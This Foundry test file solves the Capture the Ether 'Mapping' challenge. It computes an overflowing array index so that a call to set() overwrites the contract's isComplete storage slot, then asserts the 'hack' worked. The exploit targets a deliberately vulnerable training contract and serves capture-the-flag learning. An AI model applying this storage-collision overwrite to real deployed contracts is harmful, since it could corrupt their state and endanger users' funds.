// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "src/utils/BytesDeployer.sol";

interface IMappingChallenge {
    function isComplete() external view returns (bool);
}

contract MappingChallengeTest is Test {
    IMappingChallenge public mappingChallenge;

    function setUp() public {
        Deployer deployer = new Deployer();
        mappingChallenge =
            IMappingChallenge(deployer.deployContract("src/Capture_the_Ether/Math/Mapping/MappingChallenge.sol"));
    }

    function testMapping() public {
        emit log_named_string("before hack, isComplete", mappingChallenge.isComplete() ? "true" : "false");

        uint256 index = UINT256_MAX - uint256(keccak256(abi.encode(1))) + 1;
        bytes memory setCallData = abi.encodeWithSignature("set(uint256,uint256)", index, 1);

        (bool success,) = address(mappingChallenge).call{gas: 100000, value: 0}(setCallData);
        assertTrue(success);

        emit log_named_string("after hack, isComplete", mappingChallenge.isComplete() ? "true" : "false");

        assertTrue(mappingChallenge.isComplete());
    }
}
